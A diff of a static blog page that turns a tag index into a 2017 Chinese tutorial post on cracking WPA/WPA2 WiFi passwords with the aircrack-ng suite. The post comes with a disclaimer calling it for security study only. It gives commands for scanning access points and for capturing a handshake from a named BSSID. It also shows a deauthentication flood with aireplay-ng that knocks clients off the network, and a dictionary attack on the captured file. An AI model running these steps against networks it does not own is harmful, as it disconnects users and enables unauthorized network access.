@@ -6,15 +6,42 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://y00z.github.io">
-  <title>标签 | Yooz的博客</title>
+  <title>wifi破解之WPA/WPA2抓包跑包 | Yooz的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="标签">
-<meta property="og:url" content="http://y00z.github.io/tags/index.html">
+  <meta name="description" content="前言
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
+
+
+
+正文
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Aircrack-ng就不多介绍了，一个非常经典的破解套件,也有很多其他的一些软件，水滴，奶瓶，cdlinux等这些就不多说了，都是基">
+<meta property="og:type" content="article">
+<meta property="og:title" content="wifi破解之WPA/WPA2抓包跑包">
+<meta property="og:url" content="http://y00z.github.io/2017/04/12/wifi破解之WPA-WPA2抓包跑包/index.html">
 <meta property="og:site_name" content="Yooz的博客">
-<meta property="og:updated_time" content="2016-12-14T02:11:41.380Z">
+<meta property="og:description" content="前言
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
+
+
+
+正文
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Aircrack-ng就不多介绍了，一个非常经典的破解套件,也有很多其他的一些软件，水滴，奶瓶，cdlinux等这些就不多说了，都是基">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-64.jpg">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-65.jpg">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-68.jpg">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-66.jpg">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-67.jpg">
+<meta property="og:updated_time" content="2017-04-28T03:40:28.560Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="标签">
+<meta name="twitter:title" content="wifi破解之WPA/WPA2抓包跑包">
+<meta name="twitter:description" content="前言
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
+
+
+
+正文
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Aircrack-ng就不多介绍了，一个非常经典的破解套件,也有很多其他的一些软件，水滴，奶瓶，cdlinux等这些就不多说了，都是基">
+<meta name="twitter:image" content="http://y00z.github.io/images/pasted-64.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Yooz的博客" type="application/atom+xml">
   
@@ -144,27 +171,60 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="page-undefined" class="article article-type-page " itemscope itemprop="blogPost">
+            <article id="post-wifi破解之WPA-WPA2抓包跑包" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      标签
+      wifi破解之WPA/WPA2抓包跑包
     </h1>
   
 
         
-        <a href="/tags/index.html" class="archive-article-date">
-  	<time datetime="2016-12-14T02:05:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-14</time>
+        <a href="/2017/04/12/wifi破解之WPA-WPA2抓包跑包/" class="archive-article-date">
+  	<time datetime="2017-04-12T13:13:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-12</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote>
+<font color="#ff0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>
+
+
+</blockquote>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><blockquote>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Aircrack-ng就不多介绍了，一个非常经典的破解套件,也有很多其他的一些软件，水滴，奶瓶，cdlinux等这些就不多说了，都是基于Aircrack-ng的<a id="more"></a></p>
+</blockquote>
+<h5 id="扫描ap"><a href="#扫描ap" class="headerlink" title="扫描ap"></a>扫描ap</h5><blockquote>
+<p>准备一个无限网卡，然后ifconfig可以看到网卡信息,如果看不到是因为无线网卡没启用就ifconfig -a查看全部无线网卡，可以ifconfig wlan0 up来启用。</p>
+<p><img src="/images/pasted-64.jpg" alt=""></p>
+<p>然后扫描一下附近的ap。</p>
+<ul>
+<li>airodump-ng wlan0<br>wlan0是ifconfig的网卡名称，<br>注意：<br>我用的是kali2.0，其他版本的可能需要airmon-ng start wlan0把网卡置于监听模式</li>
+</ul>
+<p><img src="/images/pasted-65.jpg" alt=""></p>
+<p>下面的STATION为连接AP的客户端，看BSSID来区分客户端属于哪个AP的<br>注意：<br>抓包必须要有客户端连接才可以抓包。</p>
+</blockquote>
+<h5 id="抓握手包"><a href="#抓握手包" class="headerlink" title="抓握手包"></a>抓握手包</h5><blockquote>
+<p>扫描到AP信息后来抓包</p>
+<ul>
+<li>airodump-ng –bssid EC:88:8F:8A:9C:A0 -w mywifi -c 6 wlan0<br>-bssid 要抓的ap的mac<br>-w 保存的包名<br>-c 信道(就是扫描中的CH)<br>注意：<br>抓包中需要攻击ap，让客户端断线，客户端重新连接ap后才可以抓到包。<br>可以用aireplay-ng组件来攻击ap</li>
+<li>aireplay-ng -0 0 -a EC:88:8F:8A:9C:A0 wlan0<br>-0 冲突攻击模式<br>-a ap的mac</li>
+</ul>
+<p><img src="/images/pasted-68.jpg" alt=""></p>
+<p>抓到握手包后右上角会显示抓到包的客户端mac<br><img src="/images/pasted-66.jpg" alt=""></p>
+</blockquote>
+<h5 id="跑包"><a href="#跑包" class="headerlink" title="跑包"></a>跑包</h5><ul>
+<li>aircrack-ng -w [字典] [抓到的cap包]</li>
+</ul>
+<blockquote>
+<p><img src="/images/pasted-67.jpg" alt=""></p>
+</blockquote>
+
       
 
       
@@ -203,6 +263,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全攻防</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -253,7 +324,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://y00z.github.io/tags/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://y00z.github.io/2017/04/12/wifi破解之WPA-WPA2抓包跑包/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -265,6 +336,25 @@
 </article>
 
   
+<nav id="article-nav">
+  
+    <a href="/2017/04/14/内网王者之arp攻击/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          内网王者之arp攻击
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/04/04/burp爆破http-Basic认证/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">burp爆破http Basic认证</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 
 
@@ -297,7 +387,7 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
